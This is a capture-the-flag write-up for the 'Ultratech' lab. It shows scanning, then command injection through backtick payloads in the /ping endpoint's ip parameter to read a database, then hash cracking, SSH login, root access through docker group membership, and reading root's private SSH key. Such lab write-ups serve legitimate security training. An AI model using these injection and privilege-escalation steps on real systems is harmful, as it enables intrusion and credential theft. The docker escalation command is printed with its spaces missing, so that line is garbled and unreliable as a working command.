# Ultratech

## 1. Introduction

### 1.1 Background

The **Ultratech** machine is a CTF-style lab focused on web exploitation and privilege escalation in Linux systems. This challenge combines reconnaissance techniques, web application analysis, API vulnerability exploitation, and abuse of insecure system configurations to gain root access.

### 1.2 Objectives

- Identify exposed services on the system  
- Enumerate the web application and its endpoints  
- Exploit a command execution vulnerability  
- Escalate privileges to root  

---

## 2. Enumeration

### 2.1 Nmap

We begin with a full port scan:

```bash
nmap -sCV -p- $IP
```

Relevant results:

- **8081/tcp → Node.js (Express)**  
- **31331/tcp → Apache (website)**  

This suggests:

- Backend API in Node.js  
- Frontend in Apache  

### 2.2 Web

Accessing:

```
http://IP:31331
```

We observe a page titled:

> UltraTech - The best of technology

Through inspection (and tools like Burp Suite), two important endpoints are identified:

```
http://IP:8081/ping?ip=
http://IP:8081/auth?login=&password=
```

This indicates that the web application interacts with an API on port 8081.

## 3. Exploitation

### 3.1 File Reading

We analyze the `/ping` endpoint.

Initial test:

```
http://IP:8081/ping?ip=ls
```

Response:

```
ping: ls: Temporary failure in name resolution
```

This indicates that the input is being passed to a system command.

We test command execution using backticks:

```
http://IP:8081/ping?ip=`ls`
```

Response:

```
ping: utech.db.sqlite: Name or service not known
```

We attempt to read the database:

```
http://IP:8081/ping?ip=`cat utech.db.sqlite`
```

A hash is obtained:

```
f357a0***************
```

### 3.2 Hash Cracking

We use hashcat:

```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```

Result:

```
f357a0***************:n*******
```

### 3.3 SSH Access

Using the obtained credentials:

```
ssh r00t@IP
```

Access to the system is achieved.

---

## 4. Post-Exploitation

### 4.1 Privilege Escalation

Once inside, system enumeration is performed.

It is detected that the user belongs to the group:

```
docker
```

This allows running containers with access to the host system.

We use:

```bash
docker run-v /:/mnt--rm-itbashchroot /mntsh
```

This grants access as **root**.

### 4.2 Evidence Collection

We access:

```bash
cat /root/.ssh/id_rsa
```

The private key (flag) is obtained:

```
MIIEogIBA...
```
